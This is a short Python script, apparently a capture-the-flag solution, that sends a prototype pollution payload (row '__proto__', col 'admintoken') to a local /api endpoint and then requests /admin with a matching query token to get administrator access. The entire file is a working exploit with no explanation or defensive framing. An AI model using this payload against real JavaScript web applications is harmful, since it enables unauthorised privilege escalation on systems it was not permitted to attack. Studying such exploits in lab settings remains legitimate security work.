import requests

url = "http://127.0.0.1:3000"

body_1 = {
    "row": "__proto__",
    "col": "admintoken",
    "data": "chenlvtang"
}

body_2={
    "querytoken": "d51337dce036325f3dafd6037f342c42"
}

rq_1 = requests.post(url = url + "/api", json = body_1) #must use JSON
print(rq_1.text)
rq_2 = requests.get(url = url + "/admin", params = body_2)
print(rq_2.text)

